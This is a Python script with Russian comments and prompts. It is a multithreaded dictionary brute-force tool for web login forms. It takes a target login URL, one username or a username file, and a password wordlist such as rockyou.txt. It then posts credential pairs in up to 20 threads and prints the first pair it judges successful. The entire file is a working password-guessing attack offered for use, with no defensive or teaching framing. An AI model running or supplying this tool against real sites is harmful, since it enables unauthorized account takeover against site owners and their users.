# -*- coding: utf-8 -*-
import requests
import time
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from queue import Queue, Empty

# === Настройки ===
MAX_THREADS = 20
TIMEOUT = 10
CHUNK_SIZE = 4096  # Увеличен для быстрого чтения больших файлов

# === Глобальные переменные для прогресса ===
processed_count = 0
total_tasks = 0
progress_lock = threading.Lock()
found_result = False

# === Функции ===

def read_large_file(file_path):
    """Построчное чтение большого файла с оптимальной производительностью"""
    try:
        with open(file_path, 'r', encoding='latin-1', errors='ignore') as f:
            while True:
                lines = f.readlines(CHUNK_SIZE)
                if not lines:
                    break
                for line in lines:
                    yield line.strip()
    except FileNotFoundError:
        print(f"[Ошибка] Файл не найден: {file_path}")
        sys.exit(1)

def try_login(url, username, password, session, verify_ssl):
    """Безопасная попытка входа с несколькими независимыми условиями успеха"""
    try:
        payload = {
            'username': username,
            'password': password
        }
        
        response = session.post(
            url,
            data=payload,
            timeout=TIMEOUT,
            allow_redirects=True
        )
        
        # Условие 1: Редирект 302
        condition_302 = response.status_code == 302
        
        # Условие 2: Ключевые слова в теле ответа
        keywords = ["Welcome", "Dashboard", "phpMyAdmin", "Главная"]
        condition_keywords = any(keyword in response.text for keyword in keywords)
        
        # Условие 3: Наличие куки 'session'
        condition_cookie = any('session' in cookie.name for cookie in session.cookies)
        
        # Успех, если хотя бы одно из условий выполнено
        success = condition_302 or condition_keywords or condition_cookie
        
        return success, username, password
        
    except requests.exceptions.RequestException as e:
        return False, username, password

def update_progress():
    """Обновление прогресс-бара в консоли"""
    global processed_count, total_tasks, found_result
    
    while not found_result and processed_count < total_tasks:
        with progress_lock:
            percent = (processed_count / total_tasks) * 100 if total_tasks else 0
            bar_length = 40
            filled_length = int(bar_length * percent // 100)
            bar = '=' * filled_length + '-' * (bar_length - filled_length)
            sys.stdout.write(f'\r[{bar}] {percent:.1f}% | Обработано: {processed_count}/{total_tasks}')
            sys.stdout.flush()
        time.sleep(0.2)

def worker(queue, result, stop_event, url, verify_ssl):
    """Рабочий поток для обработки задач"""
    with requests.Session() as session:
        while not stop_event.is_set():
            try:
                task = queue.get_nowait()
                username, password = task['username'], task['password']
            except Empty:
                break
                
            success, user, pwd = try_login(url, username, password, session, verify_ssl)
            
            with progress_lock:
                global processed_count
                processed_count += 1
            
            if success:
                result.append((user, pwd))
                stop_event.set()
                break
                
            queue.task_done()

def start_bruteforce(url, usernames, password_file, threads, verify_ssl):
    """Основной цикл брутфорса"""
    global processed_count, total_tasks, found_result
    processed_count = 0
    found_result = False
    
    print("\n[+] Начинаем атаку")
    print(f"[+] Цель: {url}")
    print(f"[+] Потоки: {threads}")
    
    start_time = time.time()
    result = []
    stop_event = threading.Event()
    queue = Queue()

    # Подсчёт общего количества паролей
    print("[+] Подсчёт количества паролей в файле...")
    total_tasks = sum(1 for _ in read_large_file(password_file))
    print(f"[+] Найдено паролей: {total_tasks}")
    
    # Восстанавливаем указатель файла
    def password_generator():
        for pwd in read_large_file(password_file):
            yield pwd

    # Создаём очередь задач
    for user in usernames:
        for password in password_generator():
            if stop_event.is_set():
                break
            queue.put({'username': user, 'password': password})
    
    # Запуск потока обновления прогресса
    progress_thread = threading.Thread(target=update_progress, daemon=True)
    progress_thread.start()

    # Запуск потоков брутфорса
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [
            executor.submit(worker, queue, result, stop_event, url, verify_ssl)
            for _ in range(threads)
        ]
        
        try:
            while not stop_event.is_set():
                if any(f.done() for f in futures):
                    break
                time.sleep(0.1)
        except KeyboardInterrupt:
            print("\n[!] Прервано пользователем")
            stop_event.set()
    
    # Ожидание завершения прогресс-бара
    found_result = True
    progress_thread.join()
    sys.stdout.write('\n')
    sys.stdout.flush()

    # Вывод результата
    if result:
        print(f"\n\n[+] УСПЕШНО: {result[0][0]}:{result[0][1]}")
    else:
        print("\n\n[-] Пароль не найден")
    
    print(f"[+] Время выполнения: {time.time() - start_time:.2f} сек")

# === Главная функция ===
if __name__ == "__main__":
    
    # Ввод параметров
    target_url = input("Введите URL логина: ").strip()
    user_mode = input("Выберите режим пользователей: (1) Один пользователь, (2) Файл: ").strip()
    
    # Обработка пользователей
    usernames = []
    if user_mode == "1":
        usernames = [input("Введите имя пользователя: ").strip()]
    elif user_mode == "2":
        user_file = input("Путь к файлу с пользователями: ").strip()
        usernames = [line.strip() for line in open(user_file, 'r', encoding='utf-8')]
    
    # Путь к rockyou.txt
    password_file = input("Путь к словарю (например, rockyou.txt): ").strip()
    
    # Настройки потоков
    threads = min(MAX_THREADS, int(input(f"Количество потоков (макс {MAX_THREADS}): ") or "10"))
    verify_ssl = input("Проверять SSL? (y/N): ").strip().lower() == "y"
    
    # Запуск атаки
    start_bruteforce(target_url, usernames, password_file, threads, verify_ssl)
